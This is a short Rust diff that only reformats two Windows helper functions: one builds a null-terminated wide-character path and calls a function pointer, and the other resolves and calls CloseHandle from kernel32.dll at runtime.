     let mut wide = crate::heap::Vec::<u16>::with_capacity(path.len());
-    for &by in path { if by == 0 { break; } wide.push(by as u16); }
+    for &by in path {
+        if by == 0 {
+            break;
+        }
+        wide.push(by as u16);
+    }
     wide.push(0);
     unsafe { df(wide.as_ptr()) }
 }
 
 unsafe fn close_h(h: *mut c_void) -> i32 {
-    let ch: unsafe extern "system" fn(*mut c_void) -> i32 = match unsafe { export_addr(b"kernel32.dll", b"CloseHandle") } {
-        Some(a) => unsafe { core::mem::transmute(a) }, None => return 0,
-    };
+    let ch: unsafe extern "system" fn(*mut c_void) -> i32 =
+        match unsafe { export_addr(b"kernel32.dll", b"CloseHandle") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return 0,
+        };
     unsafe { ch(h) }
 }
